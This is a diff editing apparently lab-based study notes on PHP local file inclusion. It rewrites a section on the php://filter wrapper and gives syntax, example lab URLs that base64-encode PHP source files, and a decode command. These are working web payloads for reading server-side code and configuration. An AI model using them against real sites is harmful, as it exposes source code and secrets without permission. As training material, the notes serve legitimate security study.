@@ -201,38 +201,44 @@ http://83.136.253.59:34423/index.php?language=languages%2f%2e%2e%2e%2e%2f%2f%2e%
 
 ---
 
-## PHP Filter Wrappers
+## PHP Stream Wrappers
 
-An LFI vulnerability in a PHP application may be levereged and extended through **PHP wrappers**. These wrappers are generally used by developers in order to access I/O streams at the application level. PHP wrappers can be utilized by an attacker in order to read source code or execute system commands. 
+An LFI vulnerability in a PHP application may be leveraged and extended through **PHP stream wrappers**. These wrappers are normally used by developers to access I/O streams at the application level, but can be abused by attackers to read source code or, in some cases, achieve code execution when combined with other techniques.
 
-Filter wrappers filter input. There are four filter categories:
+One of the most useful wrappers for LFI attacks is `php://filter`.
+
+The `php://filter` wrapper allows filters to be applied to a resource before it is processed. PHP supports several filter categories, including:
 
 - String filters
 - Conversion filters
 - Compression filters
 - Encryption filters
 
-A filter that is very useful for LFI attacks is a conversion filter called `convert.base64-encode`. 
+A particularly useful conversion filter for LFI exploitation is `convert.base64-encode`.
 
-When including PHP files through LFI, the files are usually rendered as regular HTML pages. This is useful in some cases, but not if we want to read the actual PHP source code. However, the `convert.base64-encode` may allow us to base64 encode the source code, instead of rendering the page. 
+When PHP files are included via LFI, they are normally executed and rendered as HTML, making it impossible to view their source code. By applying the `convert.base64-encode` filter, the file contents can be base64-encoded instead of executed, allowing the attacker to recover the original PHP source code.
 
-**Examples:**
+**Syntax:**
 
 ```bash
 # Syntax
 php://filter/read=convert.base64-encode/resource=<file>
+```
 
+**Examples:**
+
+```bash
 php://filter/read=convert.base64-encode/resource=index
 
 php://filter/read=convert.base64-encode/resource=configure
-```
 
-```bash
-# Base64 encode source code
+# Base64 encode PHP source code via LFI
 http://94.237.57.211:56084/index.php?language=php://filter/read=convert.base64-encode/resource=configure
 ```
 
 ![Filtered output](images/filter-wrapper.png)
+
+The returned base64 string can then be decoded:
 
 ```bash
 # Decode base64 string
@@ -240,3 +246,5 @@ echo '<string>' | base64 -d
 ```
 
 ![Filtered output](images/source-code.png)
+
+The `php://filter` does not provide code execution by itself, but is commonly used for information disclosure and source code analysis, which may lead to further exploitation.
